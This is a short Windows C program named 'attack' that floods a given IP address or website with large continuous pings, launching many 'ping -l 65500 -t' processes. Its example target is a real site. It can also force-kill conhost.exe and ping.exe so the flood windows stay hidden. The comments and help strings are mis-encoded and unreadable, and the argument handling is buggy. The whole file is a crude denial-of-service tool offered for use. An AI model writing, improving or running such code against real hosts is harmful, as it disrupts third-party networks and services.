/*
	Name: attack �������
	Copyright:
	Author: ����
	Date: 05/03/19 08:40
	Description:
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
int main(int argc, char** argv)
{
	char str[64];
	int n = 0, i = 0;
	//��������ַ���ֻ��һ��attackһ����
	if (argc == 1)
		//�����������
	{
		printf("����,û��ʹ�ò�����");
		exit(1);
	}
	if (strcmp(argv[1], "help") == 0)
	{
		printf("ʹ�ò���������ʽ����  [-ip] [-n] [-help] [-shutdown] [-nowshow]\n");
		printf("����attack 192.168.0.1 10\n");
		printf("ip��ʾip��ַ������վ�����磺www.baidu.com\n");
		printf("attack help ��ʾ����\n");
		printf("attack shutdown ��ʾ�ر����еĽ���\n");
		printf("attack ip n notshow����ʾ����̨����");
		exit(0);

	}
	if (strcmp(argv[1], "shutdown") == 0)
	{
		system("start taskkill /f /im conhost.exe");
		system("start taskkill /f /im ping.exe");
		printf_s("conhost.exe �� ping.exe�ɹ��ر�\n");
	}
	if (argc >= 3)
	{
		sprintf_s(str, "start ping -l 65500 %s -t", argv[1]);
		n = atoi(argv[2]);
		do {
			system(str);
			i++;
		} while (i < n);
		if (strcmp(argv[3], "notshow") == 0)
		{
			system("start taskkill /f /im conhost.exe");
		}
	}
	return 0;
}